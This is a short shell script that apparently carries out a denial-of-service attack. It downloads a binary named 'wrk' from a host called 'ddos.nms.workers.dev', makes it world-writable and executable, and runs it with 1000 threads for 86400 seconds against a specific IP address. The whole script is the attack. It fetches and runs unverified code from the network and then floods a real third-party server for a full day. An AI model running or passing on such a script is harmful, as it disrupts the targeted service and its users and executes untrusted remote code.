#!/bin/sh

#Download wrk
curl -O https://ddos.nms.workers.dev/wrk

#Chmod
chmod 777 wrk

#running
./wrk -t1000 -c347 -s86400s http://51.38.92.223
